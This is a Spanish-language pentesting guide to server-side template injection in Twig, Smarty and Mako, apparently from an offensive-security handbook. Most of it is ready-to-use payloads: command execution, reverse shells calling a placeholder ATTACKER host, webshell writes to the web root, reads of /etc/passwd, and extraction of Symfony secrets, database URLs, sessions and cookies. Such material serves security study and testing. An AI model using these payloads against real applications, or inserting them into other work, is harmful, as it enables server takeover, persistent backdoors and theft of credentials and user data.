# Motores PHP (Twig, Smarty) y Python (Mako)

### Twig (PHP)

Twig es el motor de plantillas estándar de **Symfony** y se usa también en **Drupal**, **Craft CMS**, **Grav** y muchas otras aplicaciones PHP. Comparte los mismos delimitadores que Jinja2 (`{{ }}` y `{% %}`), por eso es importante distinguirlos con `{{7*'7'}}`.

```php
// Código vulnerable (Symfony/Twig)
$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);
echo $twig->createTemplate("Hola " . $_GET['name'])->render([]);
//                                   ↑ concatenación directa = vulnerable
```

#### Confirmación Twig

```
{{7*7}}         → 49
{{7*'7'}}       → 49            ← confirma Twig (Jinja2 daría 7777777)
{{_self}}       → objeto del template
{{_self.env}}   → objeto Environment de Twig
```

#### Twig — Exploración del entorno

```php
{{_self}}                           # Objeto del template actual
{{_self.env}}                       # Environment de Twig
{{_self.env.getExtensions()}}       # Extensiones cargadas
{{dump(_context)}}                  # Variables disponibles en el contexto
{{app}}                             # Variable app de Symfony (si existe)
{{app.request}}                     # Objeto Request de Symfony
{{app.request.server.all|join(',')}}# Variables de servidor PHP
{{app.user}}                        # Usuario autenticado
{{app.session}}                     # Sesión activa
```

#### Twig — Escalada a RCE

Twig por sí solo no permite ejecutar funciones PHP arbitrarias, pero se puede llegar a RCE explotando los métodos del objeto `_self.env`.

**Método 1 — registerUndefinedFilterCallback (más común)**

```php
# Registrar una función PHP como "filtro" de Twig
# Luego llamar al filtro con el comando como argumento

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

# El primer bloque registra system() como callback
# El segundo lo llama con "id" como argumento → system("id")

# Otros comandos
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("whoami")}}

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /etc/passwd")}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'")}}

# Versión en una sola línea (si no hay restricción de longitud)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

**Método 2 — Via filtros de Twig con funciones PHP**

```php
# Si las funciones PHP están habilitadas como filtros:
{{'id'|system}}
{{'id'|passthru}}
{{'id'|shell_exec}}

# Via map/filter con función PHP
{{['id']|map('system')|join}}
{{['id']|map('passthru')|join}}
{{['id']|map('shell_exec')|join}}
{{['id', 0]|sort('passthru')}}

# Via reduce
{{['id']|reduce('system')}}
```

**Método 3 — Via getFilter con exec**

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
# exec() guarda output en el tercer parámetro, no lo devuelve directamente
# Usar passthru o system que sí lo imprimen
```

**Método 4 — Via Twig\_Filter en versiones antiguas**

```php
# Twig < 1.x (muy legacy)
{{_self.env.setCache("ftp://attacker.com/exploit")}}
{{_self.env.loadTemplate("exploit")}}
```

***

#### Twig — Leer archivos

```php
# Via source() si está habilitado
{{source('/etc/passwd')}}

# Via file_excerpt() (extensión de depuración)
{{'/etc/passwd'|file_excerpt(1,30)}}

# Via system
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /etc/passwd")}}

# Via file_get_contents como filtro
{{'file:///etc/passwd'|file_get_contents}}
```

#### Twig — Objetos de Symfony útiles

```php
# Si la app es Symfony, el objeto 'app' expone mucho contexto

# Sesión y usuario
{{app.user.username}}
{{app.user.roles}}
{{app.session.get('user')}}
{{app.session.all()}}

# Request
{{app.request.query.all()}}          # Parámetros GET
{{app.request.request.all()}}        # Parámetros POST
{{app.request.cookies.all()}}        # Cookies
{{app.request.server.get('HTTP_HOST')}}

# Variables de entorno (Symfony 3.4+)
{{app.request.server.get('APP_SECRET')}}  # Secret key de Symfony
{{app.request.server.get('DATABASE_URL')}}
```

### Smarty (PHP)

#### Contexto

Smarty es uno de los motores de plantillas PHP más antiguos y todavía se usa en aplicaciones legacy, algunos CMS y foros (phpBB, osCommerce). Usa `{` `}` como delimitadores.

***

#### Confirmación Smarty

```
{$smarty.version}              → 3.1.x (versión de Smarty)
{7*7}                          → 49
{math equation="7*7"}          → 49
{$smarty.server.SERVER_NAME}   → nombre del servidor
```

#### Smarty — Escalada a RCE

**Versiones antiguas (Smarty < 3.1.x) — `{php}` tag**

```php
# En versiones antiguas, el tag {php} ejecuta código PHP directamente
{php}system('id');{/php}
{php}echo shell_exec('id');{/php}
{php}passthru($_GET['cmd']);{/php}

# Webshell persistente
{php}file_put_contents('/var/www/html/shell.php','<?php system($_GET["cmd"]); ?>');{/php}
```

**Smarty 3+ — Via `{if}` que evalúa PHP**

```php
# El tag {if} evalúa expresiones PHP
{if system('id')}{/if}
{if passthru('id')}{/if}
{if shell_exec('id')}{/if}

# Reverse shell
{if system("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'")}{/if}
```

**Smarty 3+ — Via `Smarty_Internal_Write_File`**

```php
# Escribir webshell al disco
{Smarty_Internal_Write_File::writeFile(
    $SCRIPT_NAME,
    "<?php passthru(\$_GET['cmd']); ?>",
    self::clearConfig()
)}

# Más directo (si clearConfig() está accesible)
{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php','<?php system($_GET["cmd"]); ?>','')}
```

**Smarty — Via `{capture}` y evaluación**

```php
# Asignar y evaluar
{assign var=cmd value='id'}
{$smarty.template_object->smarty->_get_compile_path({$cmd})}
```

**Smarty — Via `getStreamVariable`**

```php
# Leer archivos del sistema
{$smarty.template_object->smarty->getStreamVariable('file:///etc/passwd')}
{self::getStreamVariable("file:///etc/passwd")}
```

#### Smarty — Leer archivos

```php
# Método directo con fetch
{fetch file='/etc/passwd'}
{fetch file='http://127.0.0.1/internal'}  # También SSRF

# Via getStreamVariable
{$smarty.template_object->smarty->getStreamVariable("file:///etc/passwd")}

# Via include (si el path no está restringido)
{include file='/etc/passwd'}
```

### Mako (Python)

Mako es el motor de plantillas por defecto en Pyramid y Pylons (frameworks Python). También se usa en algunas configuraciones de Bottle y scripts de generación de código. Menos común que Jinja2 pero relevante en aplicaciones Python legacy.

```python
# Código vulnerable
from mako.template import Template
template = Template("Hola ${name}")
print(template.render(name=user_input))  # Si user_input viene del usuario
```

#### Confirmación Mako

```
${7*7}           → 49
${7*7}           → 49
<% x=7 %>${x*7}  → 49
```

#### Mako — Sintaxis

```python
# Expresiones
${variable}
${7*7}
${"hello".upper()}

# Bloques de código Python
<%
    x = 7
    y = x * 7
%>
${y}

# Importar módulos directamente
<%!
    import os
%>
${os.popen('id').read()}

# Código inline
${ __import__('os').popen('id').read() }
```

#### Mako — Escalada a RCE

```python
# Via import en bloque <%!
<%!
    import os
%>
${os.popen('id').read()}

# Via __import__ inline (más compacto)
${__import__('os').popen('id').read()}
${ __import__('os').system('id') }

# Via subprocess
${__import__('subprocess').check_output(['id'])}
${__import__('subprocess').Popen(['id'],stdout=-1).communicate()[0]}

# Leer archivos
${open('/etc/passwd').read()}

# Reverse shell
<%
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'")
%>

# Inline
${__import__('os').popen("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'").read()}
```

### Tabla comparativa — PHP/Python engines

| Motor               | Confirmación        | RCE más directo                                                                        |
| ------------------- | ------------------- | -------------------------------------------------------------------------------------- |
| **Twig**            | `{{7*'7'}}` → 49    | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| **Smarty (legacy)** | `{$smarty.version}` | `{php}system('id');{/php}`                                                             |
| **Smarty (3+)**     | `{7*7}` → 49        | `{if system('id')}{/if}`                                                               |
| **Mako**            | `${7*7}` → 49       | `${__import__('os').popen('id').read()}`                                               |

### Diferencias clave Jinja2 vs Twig

```
Mismo delimitador {{ }} pero distinto lenguaje:

Jinja2 (Python):
→ {{7*'7'}} = '7777777'
→ Accede a objetos via __class__, __mro__, __subclasses__
→ cycler.__init__.__globals__.os.popen('id').read()

Twig (PHP):
→ {{7*'7'}} = 49
→ Accede a objetos via _self.env
→ {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

> En Twig, **`registerUndefinedFilterCallback` + `getFilter`** es el método más portable. Funciona porque Twig llama a la función PHP registrada cuando no encuentra el filtro por su nombre.

> Smarty en versiones modernas es más restrictivo, pero `{if system('id')}{/if}` sigue funcionando en la mayoría de configuraciones porque `{if}` evalúa expresiones PHP sin restricción.

> Mako tiene un acceso casi directo a Python (`${__import__('os')...}`), lo que lo hace más fácil de explotar que Jinja2 en algunos aspectos, pero es mucho menos frecuente en aplicaciones web modernas.
